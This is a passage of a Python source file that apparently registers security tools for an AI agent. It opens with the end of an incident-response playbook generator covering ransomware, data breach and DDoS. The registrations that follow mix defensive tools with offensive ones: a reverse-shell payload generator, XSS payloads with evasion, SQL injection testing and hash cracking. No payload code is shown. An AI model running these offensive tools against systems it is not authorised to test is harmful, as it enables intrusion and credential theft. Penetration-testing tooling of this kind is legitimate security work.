            ],
            "communications": [
                "Internal: brief executive team, legal, PR",
                "External: notify law enforcement (FBI IC3, local LE)",
                "Regulatory: assess breach notification obligations",
                "Insurance: notify cyber insurance carrier",
                "Customers: prepare communication if data compromised",
            ],
            "decision_tree_pay_ransom": [
                "1. Are backups available and verified? If YES -> restore, do NOT pay",
                "2. Is a free decryptor available? (nomoreransom.org) If YES -> use it",
                "3. Was data exfiltrated? Legal/regulatory implications?",
                "4. Consult legal counsel and law enforcement before ANY payment",
                "5. If paying: use incident response firm, never pay directly",
            ],
        }

    if incident_type in ("breach", "data_breach", "all"):
        playbooks["data_breach"] = {
            "title": f"{organization} Data Breach Response Playbook",
            "severity": "P1 — Critical",
            "immediate_actions": {
                "first_60_minutes": [
                    "Confirm the breach is real (rule out false positive)",
                    "Determine data types affected (PII, PHI, financial, credentials)",
                    "Estimate number of affected records/individuals",
                    "Preserve all evidence and access logs",
                    "Notify CISO, legal, and executive leadership",
                    "Activate incident response team",
                ],
            },
            "containment": [
                "Revoke compromised API keys, tokens, and credentials",
                "Block attacker IP addresses and IOCs",
                "Patch or disable the exploited vulnerability",
                "Enable enhanced monitoring on affected systems",
                "Review and restrict data access permissions",
            ],
            "investigation": [
                "Determine attack vector (phishing, SQLi, misconfiguration, insider)",
                "Identify all accessed or exfiltrated data",
                "Build complete timeline of attacker activity",
                "Check for backdoors or persistent access",
                "Review third-party access and supply chain risk",
            ],
            "notification_requirements": {
                "gdpr": "72 hours to supervisory authority, undue delay to individuals",
                "hipaa": "60 days to HHS, individuals, and potentially media",
                "pci_dss": "Immediately to payment brands and acquiring bank",
                "state_laws": "Varies by state: typically 30-60 days to individuals",
                "sec": "4 business days (Form 8-K) for material cybersecurity incidents",
            },
            "recovery": [
                "Force password reset for all affected accounts",
                "Offer credit monitoring to affected individuals (if PII)",
                "Implement additional security controls",
                "Conduct full vulnerability assessment",
                "Update incident response procedures based on lessons learned",
            ],
        }

    if incident_type in ("ddos", "all"):
        playbooks["ddos"] = {
            "title": f"{organization} DDoS Response Playbook",
            "severity": "P2 — High",
            "immediate_actions": {
                "first_15_minutes": [
                    "Confirm DDoS (vs. legitimate traffic spike or outage)",
                    "Identify attack type: volumetric, protocol, application-layer",
                    "Identify target: IP, service, application endpoint",
                    "Notify NOC, IR team, and management",
                    "Contact ISP and CDN/DDoS mitigation provider",
                ],
            },
            "mitigation_by_type": {
                "volumetric": [
                    "Activate upstream DDoS scrubbing (ISP or Cloudflare/Akamai/AWS Shield)",
                    "Blackhole routing for targeted IPs (last resort)",
                    "Enable GeoIP blocking if attack from specific regions",
                    "Increase bandwidth capacity if possible",
                ],
                "protocol": [
                    "Enable SYN cookies",
                    "Rate limit TCP connections per source",
                    "Drop malformed packets at firewall",
                    "Tune connection timeout values",
                ],
                "application_layer": [
                    "Enable WAF rules for the targeted endpoint",
                    "Implement CAPTCHA or JavaScript challenge",
                    "Rate limit requests per IP/session",
                    "Cache aggressively (static responses for dynamic endpoints)",
                    "Block known bad user agents and bot signatures",
                    "Implement request queuing to protect backend",
                ],
            },
            "firewall_rules": [
                "iptables -A INPUT -p tcp --syn -m limit --limit 1/s --limit-burst 4 -j ACCEPT",
                "iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s -j ACCEPT",
                "iptables -A INPUT -p tcp --dport 80 -m connlimit --connlimit-above 50 -j DROP",
            ],
            "recovery": [
                "Monitor for attack resurgence (common in multi-wave DDoS)",
                "Review logs for any exploit attempts during DDoS (distraction attack)",
                "Document attack characteristics for future pattern matching",
                "Update DDoS mitigation thresholds based on attack profile",
                "Conduct post-incident review with ISP and mitigation provider",
            ],
        }

    return {
        "organization": organization,
        "incident_type": incident_type,
        "generated": datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M UTC"),
        "playbooks": playbooks,
    }


# ===================================================================
# Tool registration
# ===================================================================

def _raw_tools():
    return [
        # -- DEFENSE --
        {
            "name": "firewall_rules",
            "description": "Generate iptables or ufw firewall rules for common server profiles. Supports rate limiting, IP blocking, and preset policies.",
            "parameters": {
                "type": "object",
                "properties": {
                    "action": {"type": "string", "enum": ["generate"], "default": "generate"},
                    "policy": {"type": "string", "enum": ["web_server", "database", "mail_server", "custom"], "default": "web_server"},
                    "allowed_ports": {"type": "string", "description": "Comma-separated ports to allow (e.g. '22,80,443')", "default": "22,80,443"},
                    "blocked_ips": {"type": "string", "description": "Comma-separated IPs to block", "default": ""},
                    "rate_limit": {"type": "boolean", "description": "Enable SSH rate limiting", "default": True},
                    "firewall_type": {"type": "string", "enum": ["iptables", "ufw"], "default": "iptables"},
                },
            },
            "function": firewall_rules,
        },
        {
            "name": "ids_rules",
            "description": "Build Snort or Suricata IDS rules for web attacks, network threats, and malware detection.",
            "parameters": {
                "type": "object",
                "properties": {
                    "rule_type": {"type": "string", "enum": ["snort", "suricata"], "default": "snort"},
                    "attack_category": {"type": "string", "enum": ["web", "network", "malware"], "default": "web"},
                    "custom_pattern": {"type": "string", "description": "Custom content pattern to detect", "default": ""},
                    "severity": {"type": "string", "enum": ["critical", "high", "medium", "low"], "default": "high"},
                },
            },
            "function": ids_rules,
        },
        {
            "name": "security_policy",
            "description": "Generate security policy templates: password policy, access control, and incident response plans.",
            "parameters": {
                "type": "object",
                "properties": {
                    "policy_type": {"type": "string", "enum": ["password", "access", "incident_response", "all"], "default": "password"},
                    "organization": {"type": "string", "default": "ACME Corp"},
                    "strictness": {"type": "string", "enum": ["standard", "strict"], "default": "standard"},
                },
            },
            "function": security_policy,
        },
        {
            "name": "log_analyzer",
            "description": "Parse auth.log/syslog content for brute force attempts, suspicious commands, privilege escalation, and failed logins.",
            "parameters": {
                "type": "object",
                "properties": {
                    "log_content": {"type": "string", "description": "Raw log content to analyze"},
                    "log_type": {"type": "string", "enum": ["auth", "syslog", "access"], "default": "auth"},
                    "log_file": {"type": "string", "description": "Path to log file (alternative to log_content)", "default": ""},
                },
            },
            "function": log_analyzer,
        },
        {
            "name": "ssl_checker",
            "description": "Check SSL/TLS certificate expiry, chain validity, protocol version, and cipher strength for a hostname.",
            "parameters": {
                "type": "object",
                "properties": {
                    "hostname": {"type": "string", "description": "Hostname to check (e.g. 'example.com')"},
                    "port": {"type": "integer", "default": 443},
                },
                "required": ["hostname"],
            },
            "function": ssl_checker,
        },
        {
            "name": "security_headers",
            "description": "Check a URL for security headers: CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy. Returns a grade A+ through F.",
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Full URL to check (e.g. 'https://example.com')"},
                },
                "required": ["url"],
            },
            "function": security_headers,
        },
        {
            "name": "compliance_checklist",
            "description": "Generate compliance checklists for SOC2, HIPAA, PCI-DSS, or GDPR with control IDs and descriptions.",
            "parameters": {
                "type": "object",
                "properties": {
                    "framework": {"type": "string", "enum": ["soc2", "hipaa", "pci_dss", "gdpr", "all"], "default": "soc2"},
                    "scope": {"type": "string", "enum": ["full", "summary"], "default": "full"},
                },
            },
            "function": compliance_checklist,
        },
        # -- PENTESTING --
        {
            "name": "port_scan",
            "description": "TCP connect scan on a target using Python sockets. Supports port ranges and common service identification.",
            "parameters": {
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "Target hostname or IP"},
                    "ports": {"type": "string", "description": "Comma-separated ports or ranges (e.g. '80,443,8000-8100')", "default": "21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,1521,3306,3389,5432,5900,6379,8080,8443,8888,9200,27017"},
                    "timeout": {"type": "number", "description": "Connection timeout in seconds", "default": 2.0},
                },
                "required": ["target"],
            },
            "function": port_scan,
        },
        {
            "name": "banner_grab",
            "description": "Grab service banners from open ports for service and version detection. Handles both plain and TLS connections.",
            "parameters": {
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "Target hostname or IP"},
                    "ports": {"type": "string", "description": "Comma-separated ports to probe", "default": "21,22,25,80,110,143,443,3306,5432,8080"},
                    "timeout": {"type": "number", "default": 5.0},
                },
                "required": ["target"],
            },
            "function": banner_grab,
        },
        {
            "name": "dir_bruteforce",
            "description": "Check for common web paths, sensitive files (.env, .git, backups), admin panels, and API endpoints on a target URL.",
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Target base URL (e.g. 'https://example.com')"},
                    "wordlist": {"type": "string", "enum": ["common", "extended"], "default": "common"},
                    "extensions": {"type": "string", "description": "File extensions to append (e.g. 'php,html,txt')", "default": ""},
                    "timeout": {"type": "integer", "default": 5},
                },
                "required": ["url"],
            },
            "function": dir_bruteforce,
        },
        {
            "name": "subdomain_enum",
            "description": "DNS subdomain brute-force enumeration. Resolves common subdomains and checks for potential subdomain takeover via dangling CNAMEs.",
            "parameters": {
                "type": "object",
                "properties": {
                    "domain": {"type": "string", "description": "Target domain (e.g. 'example.com')"},
                    "wordlist": {"type": "string", "enum": ["common", "extended"], "default": "common"},
                },
                "required": ["domain"],
            },
            "function": subdomain_enum,
        },
        {
            "name": "xss_payloads",
            "description": "Generate context-aware XSS payloads for HTML, attribute, JavaScript, URL, and DOM contexts with evasion techniques.",
            "parameters": {
                "type": "object",
                "properties": {
                    "context": {"type": "string", "enum": ["html", "attribute", "javascript", "url", "dom", "all"], "default": "html"},
                    "evasion_level": {"type": "string", "enum": ["basic", "moderate", "advanced"], "default": "basic"},
                    "custom_tag": {"type": "string", "description": "Custom HTML tag to generate payloads for", "default": ""},
                },
            },
            "function": xss_payloads,
        },
        {
            "name": "sql_injection_test",
            "description": "Test URL parameters for SQL injection: error-based, UNION-based, blind boolean, and time-based techniques.",
            "parameters": {
                "type": "object",
                "properties": {
                    "url": {"type": "string", "description": "Target URL with query parameters"},
                    "method": {"type": "string", "enum": ["GET", "POST"], "default": "GET"},
                    "param": {"type": "string", "description": "Parameter name to test", "default": "id"},
                    "test_type": {"type": "string", "enum": ["basic", "error", "union", "blind", "full"], "default": "basic"},
                },
                "required": ["url"],
            },
            "function": sql_injection_test,
        },
        {
            "name": "reverse_shell_gen",
            "description": "Generate reverse shell payloads in Bash, Python, PHP, Netcat, Perl, Ruby, PowerShell, and Socat. Includes listener commands and shell upgrade tips.",
            "parameters": {
                "type": "object",
                "properties": {
                    "lhost": {"type": "string", "description": "Listener IP address"},
                    "lport": {"type": "integer", "description": "Listener port", "default": 4444},
                    "shell_type": {"type": "string", "enum": ["bash", "python", "php", "nc", "perl", "ruby", "powershell", "socat", "all"], "default": "all"},
                    "encoding": {"type": "string", "enum": ["none", "base64", "url"], "default": "none"},
                },
                "required": ["lhost"],
            },
            "function": reverse_shell_gen,
        },
        {
            "name": "hash_cracker",
            "description": "Dictionary attack against MD5, SHA1, SHA256, SHA512, and bcrypt hashes using built-in and custom wordlists with mutations.",
            "parameters": {
                "type": "object",
                "properties": {
                    "hash_value": {"type": "string", "description": "Hash to crack"},
                    "hash_type": {"type": "string", "enum": ["auto", "md5", "sha1", "sha256", "sha512", "bcrypt"], "default": "auto"},
                    "wordlist": {"type": "string", "enum": ["builtin"], "default": "builtin"},
                    "custom_words": {"type": "string", "description": "Comma-separated custom words to try first", "default": ""},
                },
                "required": ["hash_value"],
            },
            "function": hash_cracker,
        },
        # -- CONSULTING --
        {
            "name": "security_report",
            "description": "Generate a security assessment report with risk ratings, severity breakdown, and prioritized remediation recommendations.",
            "parameters": {
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "Assessment target"},
                    "findings": {"type": "string", "description": "JSON array of findings [{title, severity, description, impact, recommendation}]", "default": "[]"},
                    "report_type": {"type": "string", "enum": ["assessment", "audit", "review"], "default": "assessment"},
                    "assessor": {"type": "string", "default": "Security Team"},
                },
                "required": ["target"],
            },
            "function": security_report,
        },
        {
            "name": "threat_model",
            "description": "Build a STRIDE threat model with per-component threat enumeration, data flow analysis, and severity ratings.",
            "parameters": {
                "type": "object",
                "properties": {
                    "system_name": {"type": "string", "description": "Name of the system being modeled"},
                    "components": {"type": "string", "description": "Comma-separated components (e.g. 'web_app,api,database')", "default": "web_app,api,database"},
                    "data_flows": {"type": "string", "description": "Comma-separated data flows (e.g. 'user->web_app,web_app->api')", "default": "user->web_app,web_app->api,api->database"},
                    "methodology": {"type": "string", "enum": ["stride"], "default": "stride"},
                },
                "required": ["system_name"],
            },
            "function": threat_model,
        },
        {
            "name": "risk_matrix",
            "description": "Score risks using a 5x5 likelihood vs impact matrix. Produces ratings from negligible to critical with response strategies.",
            "parameters": {
                "type": "object",
                "properties": {
                    "risks": {"type": "string", "description": "JSON array of risks [{name, likelihood(1-5), impact(1-5)}]", "default": "[]"},
                    "custom_risks": {"type": "string", "description": "Semicolon-separated risks: 'name,likelihood,impact;...'", "default": ""},
                },
            },
            "function": risk_matrix,
        },
        {
            "name": "pentest_report",
            "description": "Generate a full penetration test report with executive summary, methodology, findings, and remediation roadmap.",
            "parameters": {
                "type": "object",
                "properties": {
                    "target": {"type": "string", "description": "Pentest target"},
                    "scope": {"type": "string", "enum": ["external", "internal", "web_app", "mobile", "full"], "default": "external"},
                    "findings": {"type": "string", "description": "JSON array of findings [{title, severity, description, component, steps, impact, recommendation}]", "default": "[]"},
                    "tester": {"type": "string", "default": "Penetration Test Team"},
                    "methodology": {"type": "string", "enum": ["OWASP", "PTES", "OSSTMM", "NIST"], "default": "OWASP"},
                },
                "required": ["target"],
            },
            "function": pentest_report,
        },
        {
            "name": "incident_playbook",
            "description": "Generate incident response playbooks for ransomware, data breach, and DDoS attacks with step-by-step procedures, communication plans, and recovery checklists.",
            "parameters": {
                "type": "object",
                "properties": {
                    "incident_type": {"type": "string", "enum": ["ransomware", "breach", "data_breach", "ddos", "all"], "default": "ransomware"},
                    "organization": {"type": "string", "default": "Organization"},
                },
            },
            "function": incident_playbook,
        },
    ]


def get_tools():
    return adapt_tools(_raw_tools())
